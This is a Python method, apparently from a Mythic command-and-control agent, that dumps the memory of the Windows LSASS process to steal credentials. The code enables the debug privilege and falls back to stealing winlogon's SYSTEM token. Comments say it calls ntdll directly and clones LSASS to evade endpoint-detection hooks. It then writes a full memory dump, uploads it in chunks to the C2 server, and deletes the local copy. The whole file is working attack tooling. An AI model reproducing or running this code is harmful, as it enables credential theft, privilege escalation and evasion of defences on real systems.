    def dump_lsass(self, task_id, output_path=""):
        if platform.system() != 'Windows':
            return "dump_lsass: only supported on Windows"

        try:
            import ctypes
            import ctypes.wintypes as W

            # ── constantes ───────────────────────────────────────────────────
            PROCESS_ALL_ACCESS          = 0x001F0FFF
            PROCESS_QUERY_INFORMATION   = 0x0400
            TH32CS_SNAPPROCESS          = 0x00000002
            GENERIC_WRITE               = 0x40000000
            FILE_SHARE_NONE             = 0x00000000
            CREATE_ALWAYS               = 2
            FILE_ATTRIBUTE_NORMAL       = 0x00000080
            MiniDumpWithFullMemory      = 0x00000002
            TOKEN_DUPLICATE             = 0x0002
            TOKEN_QUERY                 = 0x0008
            TOKEN_IMPERSONATE           = 0x0004
            TOKEN_ASSIGN_PRIMARY        = 0x0001
            TOKEN_ALL_ACCESS            = 0x000F01FF
            SecurityImpersonation       = 2
            TokenImpersonation          = 2
            SE_DEBUG_PRIVILEGE          = 20      # índice ntdll

            kernel32 = ctypes.windll.kernel32
            ntdll    = ctypes.windll.ntdll
            advapi32 = ctypes.windll.advapi32

            try:
                dbghelp = ctypes.WinDLL('dbghelp.dll', use_last_error=True)
            except OSError as e:
                return "dump_lsass: falha ao carregar dbghelp.dll: {}".format(e)

            INVALID_HANDLE = ctypes.c_size_t(-1).value

            # ── estruturas de apoio ──────────────────────────────────────────
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize",              W.DWORD),
                    ("cntUsage",            W.DWORD),
                    ("th32ProcessID",       W.DWORD),
                    ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID",        W.DWORD),
                    ("cntThreads",          W.DWORD),
                    ("th32ParentProcessID", W.DWORD),
                    ("pcPriClassBase",      ctypes.c_long),
                    ("dwFlags",             W.DWORD),
                    ("szExeFile",           ctypes.c_char * 260),
                ]

            class OBJECT_ATTRIBUTES(ctypes.Structure):
                _fields_ = [
                    ("Length",                   ctypes.c_ulong),
                    ("RootDirectory",            ctypes.c_void_p),
                    ("ObjectName",               ctypes.c_void_p),
                    ("Attributes",               ctypes.c_ulong),
                    ("SecurityDescriptor",       ctypes.c_void_p),
                    ("SecurityQualityOfService", ctypes.c_void_p),
                ]

            class CLIENT_ID(ctypes.Structure):
                _fields_ = [
                    ("UniqueProcess", ctypes.c_void_p),
                    ("UniqueThread",  ctypes.c_void_p),
                ]

            # ── helper: itera snapshot de processos ──────────────────────────
            def _enum_processes():
                snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
                if snap == INVALID_HANDLE or snap is None:
                    return {}
                result = {}
                entry = PROCESSENTRY32()
                entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
                if kernel32.Process32First(snap, ctypes.byref(entry)):
                    while True:
                        name = entry.szExeFile.lower().decode(errors='ignore')
                        result.setdefault(name, []).append(int(entry.th32ProcessID))
                        if not kernel32.Process32Next(snap, ctypes.byref(entry)):
                            break
                kernel32.CloseHandle(snap)
                return result

            # ── helper: abre processo via NtOpenProcess (bypassa hooks kernel32) ──
            ntdll.NtOpenProcess.restype  = ctypes.c_ulong
            ntdll.NtOpenProcess.argtypes = [
                ctypes.POINTER(W.HANDLE),
                W.DWORD,
                ctypes.POINTER(OBJECT_ATTRIBUTES),
                ctypes.POINTER(CLIENT_ID),
            ]

            def _nt_open_process(pid, access):
                obj  = OBJECT_ATTRIBUTES()
                obj.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
                cid  = CLIENT_ID()
                cid.UniqueProcess = ctypes.c_void_p(pid)
                cid.UniqueThread  = ctypes.c_void_p(0)
                h    = W.HANDLE(0)
                nt   = ntdll.NtOpenProcess(ctypes.byref(h), access,
                                           ctypes.byref(obj), ctypes.byref(cid))
                return h if nt == 0 else None

            # ── Etapa 1: habilita SeDebugPrivilege via RtlAdjustPrivilege ────
            # Chama ntdll diretamente — advapi32.AdjustTokenPrivileges é
            # rotineiramente hookado por EDR e bloqueado pelo token UAC filtrado.
            ntdll.RtlAdjustPrivilege.restype  = ctypes.c_ulong
            ntdll.RtlAdjustPrivilege.argtypes = [
                ctypes.c_ulong,                   # Privilege
                ctypes.c_bool,                    # Enable
                ctypes.c_bool,                    # CurrentThread (False = process)
                ctypes.POINTER(ctypes.c_bool),    # PreviousValue (out)
            ]
            prev = ctypes.c_bool(False)
            ns_priv = ntdll.RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, True, False,
                                               ctypes.byref(prev))

            # ── Etapa 1b: fallback — roubo de token SYSTEM via winlogon ──────
            # Se RtlAdjustPrivilege falhou (token sem o priv, ex.: UAC split),
            # duplica o token de winlogon.exe (sempre SYSTEM) e impersona.
            if ns_priv != 0:
                procs = _enum_processes()
                system_pid = None
                for name in ("winlogon.exe", "services.exe", "wininit.exe"):
                    if name in procs:
                        system_pid = procs[name][0]
                        break

                if not system_pid:
                    return ("dump_lsass: RtlAdjustPrivilege falhou (NTSTATUS 0x{:08X}) "
                            "e nenhum processo SYSTEM encontrado para fallback".format(
                                ns_priv & 0xFFFFFFFF))

                sys_h = _nt_open_process(system_pid, PROCESS_QUERY_INFORMATION)
                if not sys_h:
                    return ("dump_lsass: RtlAdjustPrivilege falhou e nao foi possivel "
                            "abrir {} (pid {}) para roubo de token".format(name, system_pid))

                tok_orig = W.HANDLE(0)
                if not advapi32.OpenProcessToken(sys_h, TOKEN_DUPLICATE | TOKEN_QUERY,
                                                 ctypes.byref(tok_orig)):
                    kernel32.CloseHandle(sys_h)
                    return "dump_lsass: OpenProcessToken(winlogon) falhou (error {})".format(
                        kernel32.GetLastError())
                kernel32.CloseHandle(sys_h)

                tok_dup = W.HANDLE(0)
                if not advapi32.DuplicateTokenEx(
                        tok_orig, TOKEN_ALL_ACCESS, None,
                        SecurityImpersonation, TokenImpersonation,
                        ctypes.byref(tok_dup)):
                    kernel32.CloseHandle(tok_orig)
                    return "dump_lsass: DuplicateTokenEx falhou (error {})".format(
                        kernel32.GetLastError())
                kernel32.CloseHandle(tok_orig)

                if not advapi32.ImpersonateLoggedOnUser(tok_dup):
                    kernel32.CloseHandle(tok_dup)
                    return "dump_lsass: ImpersonateLoggedOnUser falhou (error {})".format(
                        kernel32.GetLastError())
                kernel32.CloseHandle(tok_dup)

            # ── Etapa 2: localiza PID do lsass.exe ───────────────────────────
            procs = _enum_processes()
            if "lsass.exe" not in procs:
                return "dump_lsass: lsass.exe nao encontrado na lista de processos"
            lsass_pid = procs["lsass.exe"][0]

            # ── Etapa 3: abre LSASS via NtOpenProcess ────────────────────────
            lsass_handle = _nt_open_process(lsass_pid, PROCESS_ALL_ACCESS)
            if not lsass_handle:
                return ("dump_lsass: NtOpenProcess(lsass, pid={}) falhou — "
                        "verifique se o agente esta elevado (SeDebugPrivilege)".format(lsass_pid))

            # ── Etapa 4: clona LSASS via NtCreateProcessEx ───────────────────
            # ParentProcess = lsass_handle → herda VAD completo (clone em memória).
            # Processo filho sem threads, sem PID "real" no sentido de dump.
            # MiniDumpWriteDump no clone (ProcessId=0) ≠ MiniDumpWriteDump(lsass_pid)
            # → bypassa hooks de EDR que filtram por PID real do LSASS.
            ntdll.NtCreateProcessEx.restype  = ctypes.c_ulong
            ntdll.NtCreateProcessEx.argtypes = [
                ctypes.POINTER(W.HANDLE),
                W.DWORD,
                ctypes.c_void_p,
                W.HANDLE,
                W.BOOL,
                ctypes.c_void_p,
                ctypes.c_void_p,
                ctypes.c_void_p,
                W.BOOL,
            ]
            forked_handle = W.HANDLE(0)
            ntstatus = ntdll.NtCreateProcessEx(
                ctypes.byref(forked_handle),
                PROCESS_ALL_ACCESS,
                None,
                lsass_handle,
                True,
                None, None, None,
                False
            )
            kernel32.CloseHandle(lsass_handle)

            if ntstatus != 0 or not forked_handle.value:
                return "dump_lsass: NtCreateProcessEx falhou (NTSTATUS 0x{:08X})".format(
                    ntstatus & 0xFFFFFFFF)

            # ── Etapa 5: dump do clone ────────────────────────────────────────
            if not output_path:
                output_path = os.path.join(
                    os.environ.get("TEMP", os.environ.get("TMP", os.getcwd())),
                    "forked_lsass.dmp"
                )

            kernel32.CreateFileW.restype  = ctypes.c_void_p
            kernel32.CreateFileW.argtypes = [
                W.LPCWSTR, W.DWORD, W.DWORD, ctypes.c_void_p,
                W.DWORD,   W.DWORD, ctypes.c_void_p
            ]
            hfile = kernel32.CreateFileW(
                output_path, GENERIC_WRITE, FILE_SHARE_NONE,
                None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None
            )
            if hfile is None or hfile == INVALID_HANDLE:
                kernel32.CloseHandle(forked_handle)
                return "dump_lsass: CreateFile({}) falhou (error {})".format(
                    output_path, kernel32.GetLastError())

            dbghelp.MiniDumpWriteDump.restype  = W.BOOL
            dbghelp.MiniDumpWriteDump.argtypes = [
                ctypes.c_void_p, W.DWORD, ctypes.c_void_p,
                ctypes.c_int,
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
            ]
            ok = dbghelp.MiniDumpWriteDump(
                forked_handle.value, 0, hfile,
                MiniDumpWithFullMemory, None, None, None
            )
            kernel32.CloseHandle(ctypes.c_void_p(hfile))
            kernel32.CloseHandle(forked_handle)

            # reverte impersonation se usou fallback de token
            try:
                advapi32.RevertToSelf()
            except Exception:
                pass

            if not ok:
                return "dump_lsass: MiniDumpWriteDump falhou (error {})".format(
                    ctypes.get_last_error())

            dump_size = os.path.getsize(output_path)
            if dump_size == 0:
                return "dump_lsass: dump criado mas vazio"

            # ── Etapa 6: upload para Mythic (protocolo download) ──────────────
            total_chunks = (dump_size + CHUNK_SIZE - 1) // CHUNK_SIZE

            init_resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "download": {
                        "total_chunks": total_chunks,
                        "full_path":    output_path,
                        "chunk_size":   CHUNK_SIZE,
                    }
                }]
            })

            responses_list = init_resp.get("responses", [])
            file_id = responses_list[0].get("file_id") if responses_list else None

            if not file_id:
                return ("dump_lsass: dump salvo em {} ({} bytes) "
                        "mas Mythic nao retornou file_id".format(output_path, dump_size))

            with open(output_path, 'rb') as f:
                for chunk_num in range(1, total_chunks + 1):
                    with self._taskings_lock:
                        stopped = next(
                            (t["stopped"] for t in self.taskings if t["task_id"] == task_id),
                            False
                        )
                    if stopped:
                        return "dump_lsass: job interrompido. Dump parcial em {}".format(
                            output_path)
                    content = f.read(CHUNK_SIZE)
                    if not content:
                        break
                    self.postMessageAndRetrieveResponse({
                        "action": "post_response",
                        "responses": [{
                            "task_id": task_id,
                            "download": {
                                "chunk_num":  chunk_num,
                                "file_id":    file_id,
                                "chunk_data": base64.b64encode(content).decode()
                            }
                        }]
                    })

            try:
                os.remove(output_path)
            except Exception:
                pass

            return json.dumps({
                "file_id":   file_id,
                "dump_path": output_path,
                "size":      dump_size
            })

        except Exception as e:
            return "dump_lsass error: {}".format(e)
